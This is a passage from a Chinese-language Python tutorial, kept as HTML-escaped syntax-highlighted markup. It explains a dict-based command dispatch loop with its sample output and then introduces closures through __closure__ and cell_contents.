&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-statement z-conditional z-if z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-conditional z-if z-python&quot;&gt;if&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;cmd&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-logical z-python&quot;&gt;in&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;dict&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-block z-conditional z-if z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;dict&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-python&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;cmd&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-python&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-statement z-conditional z-elseif z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-conditional z-elseif z-python&quot;&gt;elif&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;cmd&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-comparison z-python&quot;&gt;==&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;q&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-block z-conditional z-elseif z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;goodbye&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-keyword z-control z-flow z-break z-python&quot;&gt;break&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-statement z-conditional z-else z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-conditional z-else z-python&quot;&gt;else&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-block z-conditional z-else z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;Error command&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-keyword z-control z-flow z-continue z-python&quot;&gt;continue&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;代码第&lt;code&gt;1~7&lt;&#x2F;code&gt;行，定义增删改查四个函数，&lt;code&gt;print&lt;&#x2F;code&gt;就算代替具体的操作了。第9行定义一个字典。第10行开始，写了一个循环用来与用户进行交互。第11行获取用户输入的内容，第12行开始判断，用户输入的&lt;code&gt;cmd&lt;&#x2F;code&gt;是否在&lt;code&gt;dict&lt;&#x2F;code&gt;内，如果在说明&lt;code&gt;cmd&lt;&#x2F;code&gt;是&lt;code&gt;dict&lt;&#x2F;code&gt;的&lt;code&gt;key&lt;&#x2F;code&gt;，那么&lt;code&gt;dict[cmd]&lt;&#x2F;code&gt;取出对应的&lt;code&gt;value&lt;&#x2F;code&gt;，而&lt;code&gt;value&lt;&#x2F;code&gt;是对应的增删改查的函数，找到函数加括号（第13行）就能执行这个函数。完成增删改查的操作（执行print）。而第14行当用户输入“q“的时候，退出程序。第17行是当用户输入无效的命令的时候，提示并从新循环等待输入。运行结果如下例所示：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Enter command: asss     # 输入错误命令，会提示命令无效，并等待用户重新输入
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Error command           
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Enter command: add      # 输入正确的命令，执行对应的函数，并等待用户重新输入  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;add function      
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Enter command: q        # 用户输入&amp;quot;q&amp;quot;，则退出程序  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;goodbye  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Process finished with exit code 0  
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;bi-bao-han-shu&quot;&gt;闭包函数&lt;a class=&quot;zola-anchor&quot; href=&quot;#bi-bao-han-shu&quot; aria-label=&quot;Anchor link for: bi-bao-han-shu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;嵌套函数还有一种特殊的表现形式——闭合(closure)，我们称这种特殊的嵌套函数为闭包函数。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;x&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;y&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;    &lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;x&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;y&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  					&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 变量f就是bar函数，加括号就能执行
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    					&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; &amp;lt;function foo.&amp;lt;locals&amp;gt;.bar at 0x01136738&amp;gt;  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__closure__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; (&amp;lt;cell at 0x011BD070: int object at 0x604999C0&amp;gt;, &amp;lt;cell at 0x011BDED0: int object at 0x604999D0&amp;gt;)  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__closure__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-python&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-python&quot;&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-python&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;cell_contents&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;   		&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 1  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__closure__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-python&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-python&quot;&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-python&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;cell_contents&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;   		&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 2  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;参考上例来讨论一下闭包函数的特点。&lt;&#x2F;p&gt;
&lt;p&gt;闭包函数是指在函数（foo函数）内部定义的函数（bar函数），称为内部函数，该内部函数包含对嵌套作用域的引用，而不是全局作用域的引用。那么，该内部函数称为闭包函数。&lt;&#x2F;p&gt;
&lt;p&gt;闭包函数包含对嵌套作用域的引用，而不是全局作用域的引用。这句话通过第8行的打印，我们分析，虽然打印的结果只是bar函数的内存地址，但是其不仅仅是明面上的内存地址那么简单，这个bar函数还自带其外部的嵌套作用域。闭包函数相关的&lt;code&gt;__closure__&lt;&#x2F;code&gt;属性，&lt;code&gt;__closure__&lt;&#x2F;code&gt;属性定义的是一个包含 cell 对象的元组，其中元组中的每一个 cell 对象用来保存局部作用域中引用了哪些嵌套作用域变量。第9行打印的结果印证了这一点。我们在嵌套作用域内定义了2个变量x、y。而第9行的打印结果为一个元组，其内存在两个元素地址。我们通过第10~11行的打印取元组的第1个、第2个元素进一步验证，我们顺利的拿到了存在与嵌套函数x、y的变量值。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;x&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;    &lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;x&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
